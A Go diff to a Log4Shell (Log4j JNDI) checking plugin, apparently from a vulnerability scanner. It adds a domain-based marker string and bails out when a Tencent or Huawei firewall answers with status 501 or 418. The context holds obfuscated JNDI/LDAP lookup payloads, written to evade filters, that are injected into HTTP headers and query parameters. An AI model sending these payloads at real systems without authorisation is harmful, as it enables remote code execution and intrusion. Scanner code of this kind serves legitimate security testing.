@@ -43,9 +43,16 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
+	domain := utils.GetHostFromUrl(URL)
+
+	if domain == "" {
+		return false
+	}
+
 	_ = meta
 	// count := 0
-	randStr := utils.RandStringRunes(10)
+	randStr := domain + "." + utils.RandStringRunes(6)
+	// fmt.Println(randStr)
 	payloads := []string{
 		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
 		"${jndi:lda${:-}p://",
@@ -115,7 +122,15 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("X-Request-ID", fullPayload)
 					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-					_, _ = util.RequestDo(request, false)
+					resp, err := util.RequestDo(request, false)
+
+					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
+					if &resp != nil && err != nil && resp.Other != nil {
+						if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 {
+							return false
+						}
+					}
+
 				}
 
 				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
